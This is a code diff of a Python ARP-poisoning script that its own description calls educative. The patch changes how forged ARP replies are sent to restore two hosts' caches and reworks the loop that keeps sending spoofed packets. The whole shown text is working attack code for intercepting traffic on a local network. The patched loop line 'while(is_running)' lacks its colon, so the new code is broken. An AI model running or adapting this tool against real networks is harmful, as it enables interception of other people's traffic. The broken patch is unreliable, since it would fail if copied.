@@ -36,19 +36,19 @@ def check_arp(arp, src, target):
     return False
 
 def restore(src, target):
-    send(ARP(
+    sendp(Ether(dst=target[1]) / ARP(
         op=2,
         psrc=src[0],
         hwsrc=src[1],
         pdst=target[0],
-        hwdst="ff:ff:ff:ff:ff:ff"),
+        hwdst=target[1]),
     count=5)
-    send(ARP(
+    sendp(Ether(dst=src[1]) / ARP(
         op=2,
         psrc=target[0],
         hwsrc=target[1],
         pdst=src[0],
-        hwdst="ff:ff:ff:ff:ff:ff"),
+        hwdst=src[1]),
     count=5)
 
 def handle(pkt):
@@ -81,15 +81,14 @@ def handle(pkt):
             hwdst=mac_send
         )
         pkt2.show()
-        while(is_running):
-            try:
+        try:
+            while(is_running)
                 sendp(pkt, count=5, verbose=False)
                 sendp(pkt2, count=5, verbose=False)
-            except KeyboardInterrupt:
-                restore(src, target)
-                exit(1)
-            else:
                 time.sleep(2)
+        except KeyboardInterrupt:
+            restore(src, target)
+            exit(1)
 
 #--------------------argparse--------------------
 parser = argparse.ArgumentParser(description="educative program about ARP poisoning")
